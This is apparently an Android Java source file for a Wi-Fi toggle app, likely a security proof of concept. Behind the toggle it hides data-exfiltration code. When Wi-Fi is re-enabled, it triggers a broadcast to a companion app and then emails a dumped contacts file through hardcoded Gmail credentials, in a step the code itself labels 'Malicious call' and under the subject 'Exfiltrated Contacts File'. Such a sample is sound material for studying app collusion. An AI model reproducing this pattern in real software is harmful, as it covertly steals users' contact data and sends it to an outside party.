package com.example.toggle;

import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.util.Log;
import android.view.View;
import android.widget.ToggleButton;

public class Toggle extends Activity {
	private String TAG = "ToggleActivity";
	private WifiManager wifiManager; 
	private boolean IS_EXFILTRATED = false;
	private String FILE_EXISTS = "File Exists";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_toggle);
		
		Log.d(TAG+" onCreate", "IS_EXFILTRATED : "+IS_EXFILTRATED);
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
		IS_EXFILTRATED = true;
		Log.d(TAG+" onConfigurationChanged", "IS_EXFILTRATED : "+IS_EXFILTRATED);
	}
	
	public void onToggleClicked(View view) {
    	wifiManager = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
    	
        // Is the toggle on?
        boolean on = ((ToggleButton) view).isChecked();
        
        if (on) {
            // Disable wifi
        	wifiManager.setWifiEnabled(false);
        	Log.d(TAG, "Wi-Fi disabled at this point.");
        } else {
            // Enable wifi
        	wifiManager.setWifiEnabled(true);
        	
        	while( !wifiManager.isWifiEnabled() ) {
        		
        	}
        	
        	
        	if( !IS_EXFILTRATED ) {
        		IS_EXFILTRATED = true;
        		Log.d(TAG+" onToggleClicked", "IS_EXFILTRATED : "+IS_EXFILTRATED);
        		Intent intent = new Intent();
        		intent.setAction("com.ossecurity.toggle.Toggle");
        		sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
										@Override
										public void onReceive(Context context, Intent intent) {
											// TODO Auto-generated method stub
											Bundle results = getResultExtras(true);
											Log.d(TAG, "In Result Receiver : Got extra boolean = "+results.getBoolean(FILE_EXISTS));
											
											// Malicious call
											emailFile();
										}}, null, Activity.RESULT_OK, null, null);
        	}
        	
        	Log.d(TAG, "Wi-Fi enabled at this point.");
        }
    }
	
	   private void emailFile() {
	        Log.i(TAG, "Drafting email");
	        
	        final GMailSender sender = new GMailSender("sender@gmail.com", "######");
	        
	        new AsyncTask<Void, Void, Void>() {
	            @Override public Void doInBackground(Void... arg) {
	                try {  
	                	Thread.sleep(5000);
	                    sender.addAttachment("/data/data/com.ossecurity.people/cache/contactdump/export-contacts.txt");
	                    sender.sendMail("ContactsDb",   
	                        "Exfiltrated Contacts File",   
	                        "sender@gmail.com",   
	                        "receiver@gmail.com");	
	                } catch (Exception e) {   
	                    Log.e("SendMail", e.getMessage(), e);   
	                }
					return null; 
	            }
	        }.execute();
	     	
	     	
	        Log.i(TAG, "Email Sent");
	    }
}
